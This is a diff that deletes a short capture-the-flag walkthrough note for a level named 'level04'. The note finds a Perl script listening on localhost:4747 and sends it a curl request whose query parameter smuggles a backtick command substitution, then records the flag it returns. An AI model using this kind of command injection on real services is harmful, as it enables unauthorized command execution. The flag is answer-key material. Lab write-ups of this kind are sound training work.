@@ -1,4 +1,0 @@
-ls in home, we see "level04.pl"
-see in here, "# localhost:4747"
-so curl localhost:4747?x=\`getflag\`
-and we get ne2searoevaevoem4ov4ar8ap
